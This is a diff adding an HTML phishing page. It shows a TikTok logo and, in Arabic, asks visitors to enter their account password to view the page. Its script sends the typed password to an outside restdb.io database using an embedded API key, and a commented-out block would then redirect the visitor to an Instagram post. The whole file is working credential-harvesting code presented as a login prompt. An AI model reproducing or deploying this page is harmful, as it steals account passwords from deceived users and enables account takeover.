@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+  <style>
+    section{
+  height: 100vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    direction: rtl;
+}
+.form{
+  display: flex;
+  flex-direction: column;
+}
+p{
+  margin-bottom: 8%;
+}
+input{
+  font-size: 20px;
+    height: 30px;
+}
+img{
+  width: 100px;
+    height: 100px;
+    border-radius: 30%;
+}
+h2{
+  text-align: center;
+  margin: 7% 0;
+}
+button{
+  margin-top: 11%;
+    background-color: #000;
+    font-weight: bold;
+    color: white;
+    border: 0;
+    border-radius: 6px;
+    height: 5vh;
+}
+
+  </style>
+</head>
+<body>
+  <section>
+    <div>
+      <img src="../assets/TikTok.png" />
+    </div>
+    <h2>الرجاء إدخال كلمة مرور حسابك لمشاهدة هذه الصفحة</h2>
+    <div class="form" [formGroup]="form">
+      <p>كلمة المرور : </p>
+      <input id="inp" type="password" formControlName="pass"/>
+      <button type="submit" onclick="Login()">تسجيل الدخول</button>
+      <span style="color: red;margin-top: 3%;" >كلمة المرور مطلوبة</span>
+    </div>
+  </section>
+
+</body>
+<script>
+  function Login(){
+    var inp=document.getElementById('inp')
+    console.log(inp.value)
+    if(inp.value!=''){
+      var myCorsApiKey = "634be241626b9c747864ac84";
+var data = {pass:inp.value};
+
+var xhr = new XMLHttpRequest();
+xhr.withCredentials = false;
+
+xhr.addEventListener("readystatechange", function () {
+  if (this.readyState === 4) {
+    console.log(this.responseText);
+  }
+});
+
+xhr.open("POST", "https://dbpass-baf8.restdb.io/rest/pass");
+xhr.setRequestHeader("content-type", "application/json");
+xhr.setRequestHeader("x-apikey", myCorsApiKey);
+xhr.setRequestHeader("cache-control", "no-cache");
+
+xhr.send(data);
+// setTimeout(() => {
+//   window.open('https://www.instagram.com/p/Cjv6XaTId0u/?utm_source=ig_web_copy_link','_self')
+// }, 1000);
+    }
+  }
+</script>
+</html>
+
+
